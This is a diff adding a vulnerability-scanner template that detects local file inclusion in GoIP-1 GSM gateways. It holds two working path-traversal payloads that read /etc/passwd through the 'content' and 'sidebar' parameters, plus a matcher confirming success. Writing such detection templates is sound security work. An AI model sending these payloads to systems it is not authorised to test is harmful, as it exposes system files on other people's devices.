@@ -1,0 +1,29 @@
+http:
+- matchers:
+  - regex:
+    - 'root:.*:0:0:'
+    type: regex
+  method: GET
+  path:
+  - '{{BaseURL}}/default/en_US/frame.html?content=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+  - '{{BaseURL}}/default/en_US/frame.A100.html?sidebar=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+id: goip-1-lfi
+info:
+  author: gy741
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  description: GoIP-1 GSM is vulnerable to local file inclusion because input passed
+    thru the 'content' or 'sidebar' GET parameter in 'frame.html' or 'frame.A100.html'
+    is not properly sanitized before being used to read files. This can be exploited
+    by an unauthenticated attacker to read arbitrary files on the affected system.
+  metadata:
+    max-request: 2
+  name: GoIP-1 GSM - Local File Inclusion
+  reference:
+  - https://shufflingbytes.com/posts/hacking-goip-gsm-gateway/
+  - http://www.hybertone.com/uploadfile/download/20140304125509964.pdf
+  - http://en.dbltek.com/latestfirmwares.html
+  severity: high
+  tags: gsm,goip,lfi,iot,vuln
